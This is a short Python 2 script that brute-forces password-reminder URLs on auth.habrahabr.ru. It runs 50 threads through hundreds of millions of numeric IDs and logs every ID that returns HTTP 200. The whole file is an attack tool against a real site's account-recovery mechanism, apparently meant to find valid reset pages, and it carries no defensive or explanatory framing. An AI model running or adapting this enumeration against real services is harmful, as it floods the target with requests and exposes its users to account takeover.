#!/usr/bin/env python
#-*-encoding:UTF-8-*-

import requests
import Queue
import threading
import time

queue = Queue.Queue()
THREADS_COUNT = 50
start = time.time()

def worker():
    global queue
    while True:
        try:
        	pid =  queue.get_nowait()
        except Queue.Empty, error:
            return

        response = process('https://auth.habrahabr.ru/login/reminder/'+ str(pid) + '/')
        if response == 200:
            print 'https://auth.habrahabr.ru/login/reminder/' + str(pid) + '/ - 200'
            f = open('log.txt','wb')
            f.write('http://habrahabr.ru/post/' + str(pid) + '/ - 200')
            f.close()
        else:
            print 'https://auth.habrahabr.ru/login/reminder/' + str(pid) + '/ - 404'

def process(target_link):
    try:
        res = requests.head(target_link)
    except Exception ,error:
        print str(error)
    return res.status_code

def main():
    print "STARTED"
    global THREADS_COUNT
    global DEEP
    global start
    i = 100000000
    while (i < 1000000000):
        queue.put(i)
        i = i + 1

    for _ in xrange(THREADS_COUNT):
        thread_ = threading.Thread(target=worker)
        thread_.start()
    while threading.active_count() >1:
        time.sleep(1)
    finish = time.time()
    print (finish - start)
    print "FINISHED"

if __name__ == "__main__":
    main()
